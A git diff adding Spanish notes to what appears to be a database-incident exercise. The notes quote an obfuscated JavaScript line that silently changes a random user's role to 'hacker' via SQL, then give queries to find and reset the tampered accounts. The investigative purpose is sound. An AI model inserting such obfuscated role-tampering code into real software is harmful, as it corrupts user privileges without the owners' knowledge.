@@ -72,3 +72,18 @@ JOIN
 07MAY2024[18:32:21]: 1 row updated in table 'usuarios'!
 07MAY2024[18:32:22]: user #31 bought product #32!
 ~~~
+Sentencia de js
+`db[_0xf92878(0x239)]('UPDATE\x20usuarios\x20SET\x20rol\x20=\x20\x27hacker\x27\x20WHERE\x20id\x20IN\x20(SELECT\x20id\x20FROM\x20usuarios\x20ORDER\x20BY\x20RANDOM()\x20LIMIT\x201);')[_0xf92878(0x217)]();
+`
+
+primero revisar todos los redes que existan y analizar si alguno se sale de la norma.
+'SELECT DISTINCT(rol) FROM usuarios;'
+
+encontrar al / los usuarios con este rol.
+'SELECT * FROM usuarios WHERE rol = 'hacker';'
+
+y ahora para corregir esto, debo dehacer un UPDATE del rol para ponerlo al que deba.
+
+`UPDATE usuarios
+SET rol = 'usuario'
+WHERE rol = 'hacker';`
